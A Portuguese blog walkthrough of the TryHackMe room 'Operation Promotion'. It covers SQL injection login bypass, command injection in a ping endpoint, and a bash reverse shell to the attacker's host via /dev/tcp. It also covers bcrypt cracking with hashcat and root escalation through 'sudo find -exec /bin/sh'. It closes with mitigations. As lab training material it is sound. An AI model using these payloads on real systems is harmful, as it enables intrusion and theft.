---
layout: post
title: "Operation Promotion — SQLi, IDOR, Command Injection e sudo find até root"
description: "Walkthrough da room Operation Promotion (TryHackMe): reconhecimento, SQL Injection no portal RecruitCorp, enumeração de usuários, RCE via ping.php, SQLite, bcrypt, SSH e escalonamento com sudo find."
date: 2026-11-14
categories: [walkthrough]
tags: [linux, tryhackme, operation-promotion, recruitcorp, nmap, gobuster, smb, sql-injection, idor, command-injection, rce, reverse-shell, sqlite, bcrypt, hashcat, cewl, linpeas, ssh, sudo, gtfobins, privilege-escalation]
---

# Operation Promotion — SQLi, IDOR, Command Injection e sudo find até root

Nesta room do **TryHackMe**, o cenário é um teste de intrusão contra a RecruitCorp, uma empresa de recrutamento com um portal público. O objetivo era comprometer o servidor e encontrar `user.txt` e `flag.txt`.

Meu caminho começou normalmente: enumerei serviços, encontrei o painel administrativo, entrei com SQL Injection e usei uma funcionalidade de ping para executar comandos. A parte em que travei foi **o hash bcrypt de `jford`**: testei a `rockyou.txt`, gerei wordlists com CeWL e experimentei regras no Hashcat, mas não consegui recuperar a senha com essas listas. Depois, uma pista externa apontou uma candidata específica, que validei localmente com o Hashcat. A partir daí, o acesso SSH e o escalonamento para `root` foram diretos.

> **Aviso:** este walkthrough documenta um laboratório autorizado do TryHackMe. Os IPs das VMs mudam a cada reinício. As flags e credenciais mostradas pertencem ao ambiente da room.
>
> **Spoiler:** o texto contém as duas flags.

## Técnicas exploradas

| Técnica | Onde apareceu | Resultado |
|---|---|---|
| Reconhecimento e enumeração | Nmap, curl, Gobuster, SMB | Serviços e diretórios identificados |
| **SQL Injection (SQLi)** | Login em `/admin/` | Bypass de autenticação |
| **Enumeração de IDs / possível IDOR** | `/admin/users/lookup.php?id=` | Perfis de outros usuários consultados |
| **OS Command Injection → RCE** | `/admin/sysmaint-checks/ping.php` | Comandos como `www-data` |
| **Sensitive Information Disclosure** | `config/db.conf` | Hash bcrypt associado a `jford` |
| **Insecure Password Storage** | Banco SQLite | Senhas de usuários web em texto puro |
| **Offline Password Cracking** | Hashcat, modo 3200 | Senha de `jford` recuperada |
| **Privilege Escalation via sudo** | `/usr/bin/find` com `NOPASSWD` | Shell como `root` |

## Índice

1. [Ambiente e cadeia de exploração](#ambiente)
2. [Reconhecimento de rede e enumeração web](#recon)
3. [SQL Injection no login](#sqli)
4. [Lookup por ID e descoberta do endpoint de manutenção](#idor)
5. [Command Injection e reverse shell](#rce)
6. [Arquivos de configuração, SQLite e bcrypt](#credenciais)
7. [A parte em que travei: cracking e enumeração local](#dificuldade)
8. [SSH como jford e user.txt](#usuario)
9. [sudo find: escalonamento para root e flag.txt](#root)
10. [Lições aprendidas e mitigações](#licoes)
11. [Referências e posts relacionados](#referencias)

<a id="ambiente"></a>

## 1. Ambiente e cadeia de exploração

Como reiniciei as VMs várias vezes, não vale a pena fixar um IP no walkthrough. Nos comandos, substitua os valores conforme a sessão atual:

~~~bash
TARGET="<IP_ALVO>"
ATTACKER="<IP_ATTACKBOX>"
~~~

| Porta | Serviço | Identificação inicial |
|---|---|---|
| `22/tcp` | SSH | OpenSSH 9.6p1 Ubuntu |
| `80/tcp` | HTTP | Apache 2.4.58 Ubuntu |
| `139/tcp` | NetBIOS/SMB | Samba |
| `445/tcp` | SMB | Samba |

~~~text
Nmap / Gobuster
      |
      v
  /admin/ (login)
      |
      v
SQL Injection -> sessão PHP
      |
      v
User Lookup (IDs 1–9)
      |
      v
Nota da conta sysmaint
      |
      v
/admin/sysmaint-checks/ping.php
      |
      v
Command Injection -> RCE (www-data)
      |
      +----> SQLite: senhas web em texto puro
      |
      +----> config/db.conf: bcrypt de jford
                              |
                              v
                       Hashcat / SSH
                              |
                              v
                      jford -> user.txt
                              |
                              v
                  sudo NOPASSWD: find
                              |
                              v
                       root -> flag.txt
~~~

<a id="recon"></a>

## 2. Reconhecimento de rede e enumeração web

Comecei verificando conectividade e portas:

**Comandos usados:**

~~~bash
ping -c 3 "$TARGET"
nmap -sV -sS "$TARGET"
~~~

- `-sS`: SYN scan para identificar portas TCP abertas.
- `-sV`: tenta reconhecer os serviços e suas versões.

Também utilizei `fping -agq` para procurar hosts ativos na sub-rede do laboratório. O servidor RecruitCorp era o host relevante.

O HTTP retornou a página **RecruitCorp — Careers Portal**:

~~~bash
curl -i "http://$TARGET/"
curl -I "http://$TARGET/"
~~~

O site era basicamente institucional, mas continha o contato `careers@recruitcorp.thm`. Depois enumerei diretórios:

~~~bash
gobuster dir -u "http://$TARGET/" -w dir.txt -x php,txt,bak,old,zip -t 10
~~~

| Endpoint | Resultado | Observação |
|---|---|---|
| `/admin/` | `200` | Página de login |
| `/config/` | `403` | Acesso HTTP negado |
| `/robots.txt` | `200` | `Disallow: /admin/` |
| `/index.php` | `200` | Página principal |
| `/server-status` | `403` | Não acessível |

O `robots.txt` não protege diretórios: apenas informa aos robôs quais caminhos não devem rastrear. Repeti o Gobuster em `/admin/` e depois em `/admin/users/`, encontrando `dashboard.php`, `logout.php` e `lookup.php`.

<a id="sqli"></a>

## 3. SQL Injection no login

O formulário em `/admin/` era vulnerável a SQL Injection. Testei o seguinte valor no campo `username`:

~~~sql
admin' OR '1'='1' -- -
~~~

O payload fecha a string original com `'`, acrescenta uma condição verdadeira (`OR '1'='1'`) e comenta o restante da consulta (`-- -`). O login foi ignorado e recebi a sessão de administrador.

Após inspecionar o código PHP mais tarde, confirmei a causa:

~~~php
$u = $_POST['username'] ?? '';
$p = $_POST['password'] ?? '';
$query = "SELECT id, username FROM users WHERE username='$u' AND password='$p'";
$res = @$db->query($query);
~~~

A aplicação **concatena diretamente** a entrada do usuário na consulta SQL, sem parâmetros preparados.

### Guardando a sessão PHP no curl

Depois dos resets, descobri que podia refazer o login e salvar os cookies diretamente no arquivo `cookies.txt`:

~~~bash
curl -i -c cookies.txt \
  --data-urlencode "username=admin' OR '1'='1' -- -" \
  --data-urlencode 'password=test' \
  "http://$TARGET/admin/"
~~~

A resposta foi `302 Found` com redirecionamento para `/admin/dashboard.php`.

Para reutilizar a sessão:

~~~bash
curl -i -b cookies.txt "http://$TARGET/admin/dashboard.php"
~~~

- `-c cookies.txt`: grava os cookies recebidos.
- `-b cookies.txt`: envia os cookies já salvos.
- `--data-urlencode`: transmite os campos com a codificação correta; sem `-G`, os dados são enviados por POST.

> **Dica:** se a VM reiniciar ou a sessão expirar, o cookie antigo pode retornar `403 Forbidden`. É preciso autenticar novamente. Um `ping` funcionando só prova conectividade, não que a sessão HTTP esteja válida.

<a id="idor"></a>

## 4. Lookup por ID e descoberta do endpoint de manutenção

Dentro do dashboard havia um formulário de **User Lookup** que recebia um ID numérico:

~~~text
/admin/users/lookup.php?id=1
~~~

Ao alterar `id`, consegui consultar os registros 1 a 9. Alguns exemplos:

| ID | Username | Role | Observação |
|---|---|---|---|
| 1 | `admin` | admin | Primary admin account |
| 2 | `mvasquez` | recruiter | EMEA pipeline |
| 3 | `tparker` | recruiter | AMER pipeline |
| 7 | `sysmaint` | system | Service account for `/admin/sysmaint-checks/ping.php` |
| 9 | `aokafor` | recruiter | APAC |

O ID 10 não existia no teste. A possibilidade de consultar outros registros apenas mudando o identificador chamou minha atenção como **possível IDOR**. Tecnicamente, a confirmação de uma falha de autorização exigiria demonstrar acesso a dados que a conta autenticada **não deveria** consultar. Como a sessão utilizada era administrativa, o que provei diretamente foi a enumeração por IDs previsíveis.

A pista mais útil foi o comentário do usuário `sysmaint`: ele apontava para um endpoint de manutenção que não tinha aparecido na enumeração inicial.

<a id="rce"></a>

## 5. Command Injection e reverse shell

O endpoint abaixo respondeu com instruções de uso:

~~~text
/admin/sysmaint-checks/ping.php?host=<target>
~~~

O comportamento normal era executar um ping no endereço informado:

~~~bash
curl -s -b cookies.txt \
  "http://$TARGET/admin/sysmaint-checks/ping.php?host=127.0.0.1"
~~~

`127.0.0.1` é o *loopback*: nesse caso, o alvo executa `ping` contra ele mesmo, não contra a AttackBox.

Testei Command Injection usando `;` para separar comandos:

~~~bash
curl -sG -b cookies.txt \
  --data-urlencode 'host=127.0.0.1;id' \
  "http://$TARGET/admin/sysmaint-checks/ping.php"
~~~

Resposta relevante:

~~~text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
~~~

A execução remota de comandos (**RCE**) estava confirmada. Posteriormente, li o próprio código vulnerável:

~~~php
$host = $_GET['host'] ?? '';
$out = shell_exec("ping -c 1 -W 1 $host 2>&1");
echo $out;
~~~

- `$_GET['host']` recebe o valor do parâmetro HTTP.
- `shell_exec()` executa uma string por meio do shell.
- Como `$host` não é sanitizado, `;id` vira outro comando.
- `2>&1` incorpora a saída de erro à saída padrão.

A opção `-G` do `curl` faz o `--data-urlencode` ser colocado na **query string** da URL (GET), e não no corpo (POST).

### 5.1 Reverse shell com Netcat

Na AttackBox, abri um listener:

~~~bash
nc -lvnp 4444
~~~

Em outro terminal da AttackBox, acionei a RCE para o servidor se conectar de volta:

~~~bash
curl -sG -b cookies.txt \
  --data-urlencode "host=127.0.0.1;bash -c 'bash -i >& /dev/tcp/${ATTACKER}/4444 0>&1'" \
  "http://$TARGET/admin/sysmaint-checks/ping.php"
~~~

O Netcat recebeu uma conexão e abriu uma shell como `www-data`. A conexão TCP da shell é separada da conexão HTTP que iniciou o comando. Por isso, em um teste, a shell continuou ativa mesmo depois de interromper o `curl`.

### 5.2 Melhorando a shell (PTY)

Na shell remota:

~~~bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
~~~

Depois pressionei `Ctrl+Z` e, no terminal local da AttackBox:

~~~bash
stty raw -echo; fg
~~~

Após Enter, de volta à shell remota:

~~~bash
reset
stty rows 40 columns 120
~~~

- `pty.spawn()` inicia o Bash com um pseudoterminal.
- `TERM=xterm` informa o tipo de terminal.
- `stty raw -echo` desativa o processamento e o eco locais.
- `fg` retoma o Netcat.
- `reset` e `stty rows/columns` ajudam a normalizar a interação.

Se o terminal local ficar desconfigurado ao sair, `stty sane` restaura configurações usuais.

> **Dica:** conferir sempre os IPs **atuais**. Em um reset, tentei baixar um arquivo pelo IP do alvo, embora o servidor HTTP estivesse na AttackBox; o resultado foi `Connection refused`.

<a id="credenciais"></a>

## 6. Configuração, SQLite e bcrypt

Com a RCE, comecei a examinar arquivos da aplicação. Em `/var/www/html/config/db.conf`, encontrei:

~~~ini
# RecruitCorp application database config
# Pulled out of source control - DO NOT COMMIT.
db_host=localhost
db_name=recruitcorp
db_user=jford
db_pass_hash=$2b$10$QzkXmGndA2cQLozO3xAN6eWKrl6ZXyzhYTJNF67exOmTmN5oVSEfq
db_engine=sqlite3
~~~

O prefixo `$2b$10$` identifica um **bcrypt**, com fator de custo 10. Diferentemente de um hash NTLM em certos fluxos de Pass-the-Hash, esse bcrypt não serve como uma senha pronta para login SSH: precisamos recuperar a senha ou encontrar outro caminho.

O código de autenticação mostrava o caminho real do banco:

~~~php
$db = new SQLite3('/var/lib/recruitcorp/app.db');
~~~

Com a shell de `www-data`, consegui consultar as tabelas:

~~~bash
sqlite3 /var/lib/recruitcorp/app.db '.tables'
sqlite3 /var/lib/recruitcorp/app.db '.schema users'
sqlite3 -header -column /var/lib/recruitcorp/app.db 'SELECT * FROM users;'
~~~

A tabela `users` possuía nove registros e senhas web **em texto puro**. Testei essas nove senhas como candidatas ao bcrypt de `jford`, mas nenhuma correspondeu. O usuário `jford` também não aparecia na tabela web; era uma conta Linux separada, com home em `/home/jford`.

O diretório `/home/jford` possuía permissão `750`:

~~~text
drwxr-x--- jford jford /home/jford
~~~

Como `www-data` não era dono nem membro do grupo `jford`, não conseguia pesquisar seus arquivos. O mesmo problema ocorria com `/root`, que possuía permissão `700`. Por isso, os comandos `find` como `www-data` não encontraram as flags.

<a id="dificuldade"></a>

## 7. A parte em que travei: bcrypt e enumeração local

Até a descoberta do hash, a exploração foi relativamente direta. **Aqui fiquei travado.** Tentei quebrá-lo com John e Hashcat, mas a AttackBox executava bcrypt em CPU, aproximadamente **20 hashes por segundo**. A estimativa para testar toda a `rockyou.txt` era de vários dias.

### 7.1 Tentativa com rockyou

Na AttackBox, salvei o hash em um arquivo. A extensão `.hash` é apenas uma convenção; poderia ser `.txt`.

~~~bash
echo '$2b$10$QzkXmGndA2cQLozO3xAN6eWKrl6ZXyzhYTJNF67exOmTmN5oVSEfq' > jford.hash
hashcat -m 3200 -a 0 jford.hash rockyou.txt
~~~

- `-m 3200`: modo bcrypt.
- `-a 0`: ataque por dicionário.
- Aspas simples preservam os símbolos `$` do hash no Bash.

Interrompi a lista completa com apenas uma parte das senhas testadas. **Isso não prova que a senha não esteja na `rockyou.txt`**; apenas que aquela execução não a recuperou.

### 7.2 Wordlist personalizada com CeWL

Usei CeWL para extrair palavras do portal:

~~~bash
cewl -d 2 -m 4 -w recruitcorp.txt "http://$TARGET/"
wc -l recruitcorp.txt
~~~

Obtive **77 palavras**. Acrescentei informações encontradas durante a enumeração, removi duplicados e cheguei a **82 candidatos**:

~~~bash
printf '%s\n' RecruitCorp recruitcorp Hadron jford sysmaint EMEA AMER APAC 2026 Spring2026 > extras.txt
cat recruitcorp.txt extras.txt | sort -u > final.txt
hashcat -m 3200 -a 0 jford.hash final.txt
~~~

O resultado foi `Exhausted`: 82/82, nenhuma senha recuperada.

Criei também regras simples para maiúsculas, números e símbolos:

~~~bash
printf '%s\n' ':' 'c' 'u' '$1' '$!' '$2$0$2$6' 'c$1' 'c$!' 'c$2$0$2$6' > recruitcorp.rule
hashcat -m 3200 -a 0 -r recruitcorp.rule jford.hash final.txt
~~~

Esse teste processou **738 candidatos**, mas também falhou. Por exemplo, tínhamos `Spring2026!` entre as combinações possíveis, mas **não testamos a forma exata `spring2026!`** naquele conjunto de regras.

A pista para a candidata correta veio posteriormente de **uma referência externa**, não da descoberta automática do scanner nem da enumeração inicial. Eu a validei com o próprio hash:

~~~bash
printf '%s\n' 'spring2026!' > candidato.txt
hashcat -m 3200 -a 0 jford.hash candidato.txt
hashcat -m 3200 --show jford.hash
~~~

Dessa vez, o bcrypt foi recuperado: **`spring2026!`**.

### 7.3 Outros caminhos investigados

Enquanto tentava o cracking, procurei alternativas:

- **SMB anônimo:** `smbclient -L //$TARGET -N` mostrou `public` e `IPC$`, mas `public` continha apenas um `README.txt` sem informações úteis.
- **SUID e capabilities:** encontrei principalmente binários normais do Ubuntu e do Snap, sem exploração direta demonstrada.
- **Cron e timers:** nada personalizado relevante para a escalada.
- **Permissões e arquivos graváveis:** `www-data` podia alterar arquivos da aplicação, mas não encontrei scripts privilegiados graváveis.
- **LinPEAS:** trouxe hipóteses de CVEs locais, mas nenhuma confirmação que justificasse tentar exploração de kernel.

> **Lição:** um scanner como o LinPEAS aponta **candidatos**, não comprova que uma CVE é explorável naquele host. É preciso validar versão completa do pacote, patches do fornecedor e pré-requisitos.

<a id="usuario"></a>

## 8. SSH como jford e user.txt

Com a senha validada, voltei à AttackBox:

~~~bash
ssh "jford@$TARGET"
~~~

O login funcionou. Conferi usuário e diretório:

~~~bash
id
whoami
pwd
ls -la
~~~

~~~text
uid=1001(jford) gid=1001(jford) groups=1001(jford)
/home/jford
-rw------- 1 jford jford 38 ... user.txt
~~~

A flag estava no home de `jford`:

~~~bash
cat ~/user.txt
~~~

~~~text
THM{bdbee0a91ebcb0b0fafde931223efe09}
~~~

<a id="root"></a>

## 9. sudo find: de jford até root

Com a primeira flag obtida, executei:

~~~bash
sudo -l
~~~

Resultado:

~~~text
User jford may run the following commands on recruitcorp:
    (root) NOPASSWD: /usr/bin/find
~~~

**O que isso significa?**

| Parte | Significado |
|---|---|
| `jford` | Usuário que recebeu a permissão |
| `(root)` | O comando pode ser executado como root |
| `NOPASSWD` | Não precisa digitar senha para esse comando |
| `/usr/bin/find` | Único caminho de executável autorizado por essa regra |

O detalhe é que `find` possui `-exec`, capaz de iniciar outros programas. Por isso, permitir seu uso irrestrito com `sudo` equivale a conceder um caminho para executar comandos como root.

Usei a técnica documentada no **GTFOBins**:

~~~bash
sudo /usr/bin/find . -exec /bin/sh \; -quit
~~~

Explicando cada parte:

- `sudo /usr/bin/find`: inicia o `find` com privilégios de root.
- `.`: caminho inicial da busca (diretório atual).
- `-exec /bin/sh`: executa uma shell para o primeiro item encontrado.
- `\;`: encerra a expressão de `-exec`; a barra impede que o Bash interprete `;` como separador de comandos.
- `-quit`: encerra a busca logo após essa execução.

O shell herdou a identidade privilegiada:

~~~bash
id
whoami
~~~

~~~text
uid=0(root) gid=0(root) groups=0(root)
root
~~~

E a última flag estava em `/root/flag.txt`:

~~~bash
cat /root/flag.txt
~~~

~~~text
THM{d999a1f6319a9c5b48c067dfab314ba2}
~~~

**Root obtido e room concluída.**

<a id="licoes"></a>

## 10. Lições aprendidas e mitigações

Esta room mostrou uma cadeia de falhas que, isoladamente, parecem pequenas, mas juntas permitiram o comprometimento completo:

1. **SQLi** no login forneceu uma sessão autenticada sem a senha.
2. A **enumeração por ID** revelou o endpoint de manutenção `ping.php`.
3. A **Command Injection** nesse endpoint permitiu RCE como `www-data`.
4. A configuração da aplicação expôs o **bcrypt de um usuário Linux**.
5. A recuperação da senha permitiu autenticar por **SSH**.
6. Uma regra de **sudo NOPASSWD** para `find` permitiu executar uma shell como root.

### Mitigações mais importantes

| Falha | Correção recomendada |
|---|---|
| SQL Injection | Prepared statements / consultas parametrizadas |
| Enumeração e controle de acesso | Verificação de autorização por objeto e menor privilégio |
| Command Injection | Evitar shell; usar APIs com argumentos separados, validação e execução restrita |
| Senhas web em texto puro | Armazenar senhas usando algoritmos adequados como bcrypt/Argon2 e verificar com funções apropriadas |
| Hashes/segredos em configuração | Segregar secrets, restringir leitura e evitar reutilização de senhas |
| `NOPASSWD: /usr/bin/find` | Remover a permissão irrestrita ou substituí-la por um wrapper específico e seguro |

### Debrief do TryHackMe: validação e melhoria de método

O debrief do TryHackMe destacou dois acertos na exploração: confirmar o bypass de login pela resposta **302** seguida do dashboard, e validar a Command Injection com um comando seguro (`id`) antes de prosseguir com `uname`, `/etc/passwd` e a enumeração de `/home`. Isso permitiu compreender o contexto de execução antes de abrir a reverse shell.

O principal ponto de melhoria foi o tratamento dos **403 Forbidden**. Em alguns momentos, repeti a mesma injeção sem verificar o motivo da mudança. No nosso caso, a verificação posterior mostrou que **o cookie de sessão PHP estava inválido**: após renovar o login, o mesmo payload voltou a funcionar. Portanto, o 403 não foi evidência de um WAF bloqueando o comando.

**Lição prática:** se um payload que funcionava começa a falhar, registrar a resposta e investigar primeiro autenticação, cookie, caminho e mudanças no ambiente. Só depois vale alterar o vetor, a codificação ou a técnica, mudando uma variável por vez para entender o resultado.

### Dicas práticas que levei da room

- **Reconhecimento não termina no Nmap:** uma nota de usuário revelou um caminho web útil.
- **Cookie não é conectividade:** `403` pode significar sessão expirada mesmo com a máquina online.
- **`bash script.sh` não é igual a `./script.sh`:** o primeiro invoca Bash diretamente; o segundo depende do interpretador indicado e da permissão de execução.
- **Reverse shell e requisição HTTP são conexões diferentes:** um terminal pode cair sem que o outro encerre imediatamente.
- **Resultados negativos precisam ser interpretados:** `find` não listou flags nos diretórios protegidos; a `rockyou.txt` foi interrompida, não esgotada.
- **Wordlist contextual precisa cobrir combinações exatas:** `Spring2026!` não equivale a `spring2026!`.
- **Ferramentas de enumeração ajudam a orientar**, mas o ponto decisivo foi compreender os mecanismos de autenticação e de privilégio.

<a id="referencias"></a>

## 11. Referências e posts relacionados

**Referências externas:**

- [GTFOBins — find (sudo)](https://gtfobins.github.io/gtfobins/find/#sudo)
- [OWASP — SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [MITRE CWE-78 — OS Command Injection](https://cwe.mitre.org/data/definitions/78.html)
- [Hashcat — Example hashes (bcrypt, modo 3200)](https://hashcat.net/wiki/doku.php?id=example_hashes)
- [PEASS-ng — LinPEAS](https://github.com/peass-ng/PEASS-ng)

**Posts relacionados do meu blog:**

- [Silent Monitor — SQLi, Command Injection e KeePass até root](https://github.com/redp4w/redp4w.github.io/blob/main/_posts/2026-11-04-silent-monitor-sqli-command-injection-keepass-root.md)
- [Bind Shell e Reverse Shell — do Netcat ao Socat/TLS](https://github.com/redp4w/redp4w.github.io/blob/main/_posts/2026-10-07-bind-reverse-shell.md)
- [O básico de custom wordlists](https://github.com/redp4w/redp4w.github.io/blob/main/_posts/2026-10-01-criando-wordlists.md)
- [Linux Privilege Escalation](https://github.com/redp4w/redp4w.github.io/blob/main/_posts/2026-10-09-linux-privilege-escalation.md)

---

**Conclusão:** a room não exigiu um exploit de kernel. O caminho foi encadear uma SQL Injection, uma Command Injection, um hash que precisou ser recuperado e, por fim, uma permissão `sudo` perigosa. A maior dificuldade foi perceber que o cracking não estava falhando por um problema no Hashcat, mas pela seleção limitada de candidatos.